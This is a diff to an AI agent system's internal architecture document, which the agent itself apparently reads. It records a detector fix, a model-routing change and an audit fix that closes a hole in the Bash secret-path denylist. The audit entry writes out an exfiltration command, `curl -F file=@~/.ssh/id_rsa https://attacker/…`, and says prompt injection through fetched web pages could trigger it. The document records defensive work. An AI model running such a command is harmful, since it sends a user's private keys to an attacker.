@@ -8,10 +8,10 @@
 ## meta
 
 ```yaml
-describes_commit: "slice critical-echo (2026-07-03): the C+A live smoke's delegated task died critical_worker_error with its deliverable PERFECT in the deliverables dir (event 461162) — the self-referential mission made the synthesis turn its own prompt rule (which SPELLED the sentinel literal) into a plan step about the string, the worker obeyed and quoted it embedded (rg argument + 'cadena ausente' check), and the raw substring detector killed the run. C0-S3 (PR #173) had scoped echo-safety to the terminal verification phase only. Two-point fix at the single choke point: (A) _has_critical_worker_error now matches LINE-INITIAL only (^\\s*MARKER, re.MULTILINE) — embedded quotes never kill, line-initial distress declarations (any line, content or error) still trigger self-healing; (B) the standing synthesis-prompt rule no longer spells the literal and forbids writing it into plan steps. The marker never had a worker-emission contract (born c1049e1 as constant+prompt rule), so every embedded occurrence is quotation by construction. Extends §1 invariant coordinator_verifier_echo_not_critical. Predecessor: slice under-delegación C+A (doc_version 2.64) in main 8ce4a60"
-doc_version: 2.66
+describes_commit: "slice secret-path-upload-sigil (2026-07-03, audit CRITICAL-1): the Bash command-path secret denylist (_enforce_command → _path_candidate_token, runtime_policy.py) dropped curl/wget file-upload tokens of the form `field=@path` (curl -F file=@path, --form/--data name=@path) — the `=`-guard treated `field=@...` as a KEY=value assignment and discarded the whole token, so the embedded secret path never reached path_is_secret. Combined with Bash's Tier-2 auto-exec (no requires_human) and production network_policy='allow', `curl -F file=@~/.ssh/id_rsa https://attacker/…` exfiltrated a secret with no approval gate — reachable from a brain turn or delegated worker, incl. via prompt injection ingested through WebFetch/Firecrawl. Fix: _path_candidate_token now extracts the path after an `@` sigil (returns after_at when it looks like a path) BEFORE the `=`-guard, so the secret path reaches the denylist. Secret-path leg only; domain-allowlist enforcement on Bash egress intentionally NOT wired (Bash has no allowed_domains; empty=allow-all by DomainAllowlistEnforcer design, network_proxy.py:41 — restricting is a policy decision, tracked separately). PLUS slice evidence-lane-sonnet5 (2026-07-03): the web-evidence pre-step (run_evidence_worker → gather_evidence) now gets role coordinator_evidence via _role_for_worker_task while staying in lane worker, so CLAW_EVIDENCE_PROVIDER/CLAW_EVIDENCE_MODEL route agentic web search to Claude Sonnet 5 without moving code workers off the worker provider (default unset = worker mirror). Predecessor: slice critical-echo (doc_version 2.66) in main 8ce4a60."
+doc_version: 2.68
 last_verified: 2026-07-03
-verification_method: "TDD red-first: 3 new tests failed pre-fix (the LIVE 461156 fixture killing a healthy run through coordinator.run(); the detector matching embedded quotes; the standing synthesis prompt spelling the literal), green post. Positives locked: line-initial declaration on a LATER line still kills implementation (new), first-line declaration + self-healing replan (pre-existing test, untouched, still green — its prompt assertion now satisfied via audit raw_error DATA, not the rule). C0-S3 verification-phase exclusion test untouched and green. CriticalMarkerDetectorTests unit-lock the choke point. Suites: test_coordinator 85 + test_task_handler/redrive/architecture_invariants 228 total + 29 subtests. LIVE SMOKE PASSED (owner-authorized, 2026-07-03, deploy 1b9da63 pid 80619): the exact mission class that died at 461162 completed the FULL arc — organic deliver_to_owner delegation (462618, the brain citing the send-to-owner bright line), coordinator 115.9s, verifier passed, dispatch ok:true resumen_arreglos.md message_id 14691, terminal succeeded; ZERO coordinator_critical_worker_error events post-deploy, zero redrives, stderr delta 0. Honest nuance: zero sentinel mentions in the task's llm_responses ⇒ angle (B) killed the contamination AT THE SOURCE (synthesis no longer plans about the string), so angle (A)'s anchor was not challenged live this pass — it stays locked by the verbatim 461156 fixture test. Named open lanes: the pinned line-initial-quote residual, and the anchor awaiting an organic challenge. Collateral out of scope: the operational_failure_summary pre-brain dispatcher intercepted a file-production mission containing the word 'errores' (event 462505) — kin of C2-S3, noted not built."
+verification_method: "TWO slices this session. (1) secret-path-upload-sigil (audit CRITICAL-1): TDD red-first — test_curl_form_upload_secret_path_blocked failed pre-fix on all 3 field=@path forms (PermissionError not raised — the vuln, auto-exec), green post; + test_curl_upload_nonsecret_workspace_path_still_allowed guard. New invariant bash_secret_path_denylist_covers_upload_sigil. (2) evidence-lane-sonnet5: web-evidence pre-step gets role coordinator_evidence (env CLAW_EVIDENCE_PROVIDER/MODEL, default=worker mirror), TDD red-first — 3 config tests + test_evidence_worker_uses_dedicated_evidence_role failed pre (role='coordinator_worker'), green post. New invariant evidence_pre_step_role_scoped_model. No regressions: test_runtime_policy 25, config+coordinator 136, architecture_invariants+task_handler+llm 135, secret_scanning green. My changed lines ruff-clean (pre-existing F541/F841 + coordinator.py format drift at 1994/2326 are NOT from this slice — left untouched per surgical rule). LIVE SMOKE PENDING — closing gate: deploy both to ~/srv/claw-daemon clone + restart + exercise curl-form-to-secret (denied) and an evidence delegation (runs on Sonnet 5). Predecessor: slice critical-echo (doc_version 2.66) in main 8ce4a60."
 anchor_strategy: symbol_only  # path:symbol, no line numbers
 audience: claw_v2  # consumed by the agent itself
 ```
@@ -1803,9 +1803,22 @@ async_roles:
   heavy_coding:              { provider_default: worker_heavy_provider, timeout_seconds: 180 }
   research_synthesis:        { provider_default: research_provider, timeout_seconds: 90 }
   coordinator_worker:        { provider_default: worker_provider, timeout_seconds: 120 }
+  coordinator_evidence:      { provider_default: evidence_provider_or_worker, model: evidence_model_or_worker_model, timeout_seconds: 120 }
   coordinator_research:      { provider_default: research_provider, timeout_seconds: 90 }
   coordinator_verification:  { provider_default: verifier_provider_or_brain, timeout_seconds: 60 }
 ```
+
+**Invariant `evidence_pre_step_role_scoped_model`** (2026-07-03): the web-evidence
+pre-step (`run_evidence_worker` → `gather_evidence`) stays in **lane `worker`**
+(CLI sandbox, `_RETRY_LANES` retry, tool-capability) but `_role_for_worker_task`
+assigns it the dedicated role **`coordinator_evidence`**, so its model can differ
+from code workers. Resolution (`config.py`): `evidence_provider`/`evidence_model`
+from `CLAW_EVIDENCE_PROVIDER`/`CLAW_EVIDENCE_MODEL`; **both unset → mirrors the
+worker lane** (zero behavior change until opt-in). Motivation: run agentic web
+search on Claude Sonnet 5 (BrowseComp headline eval) while code stays on the
+worker provider. Test-locked: `test_config.py` (`…evidence_role_falls_back…`,
+`…evidence_role_uses_env_override`, `…evidence_model_read_from_env`) +
+`test_coordinator.py::…test_evidence_worker_uses_dedicated_evidence_role`.
 
 `LLMRouter.ask(..., role=..., timeout=...)` validates role/provider policy
 before adapter execution. Control roles fail fast if configured for Codex or
@@ -1912,6 +1925,22 @@ fail-fast on schema/validation errors. The sentinel string
 in-code tuple — secret patterns stay code-owned, not config-owned, so a
 JSON edit cannot weaken the secret denylist. New tools or risk-level
 changes require a JSON edit + tests + INTERNAL_WIRING bump.
+
+**Invariant `bash_secret_path_denylist_covers_upload_sigil`** (2026-07-03 audit
+CRITICAL-1): the Bash command-path secret check (`_enforce_command` →
+`_path_candidate_token`, `runtime_policy.py`) MUST extract the path from
+curl/wget file-upload tokens of the form `field=@path` (`-F file=@path`,
+`--form name=@path`, `--data name=@path`). Before the fix, the `=`-guard treated
+`field=@...` as a `KEY=value` assignment and dropped the token, so the embedded
+secret path never reached `path_is_secret` and a `curl -F file=@~/.ssh/id_rsa`
+exfil auto-executed at Tier 2 with no approval gate. Test-locked:
+`tests/test_runtime_policy.py::RuntimePolicyEngineTests::test_curl_form_upload_secret_path_blocked`
+(+ `test_curl_upload_nonsecret_workspace_path_still_allowed` guards against
+over-blocking). NOTE: this closes the secret-*path* leg only. Domain-allowlist
+enforcement on Bash egress is intentionally NOT wired — Bash has no
+`allowed_domains` (empty = allow-all by `DomainAllowlistEnforcer` design,
+`network_proxy.py:41`); restricting it is a policy decision (define the egress
+allowlist), tracked separately, not a code bug.
 
 Brain-lane SDK tool names (preset tools and in-process MCP tools alike) are
 enforced against these policies fail-closed in BOTH the PreToolUse hook and
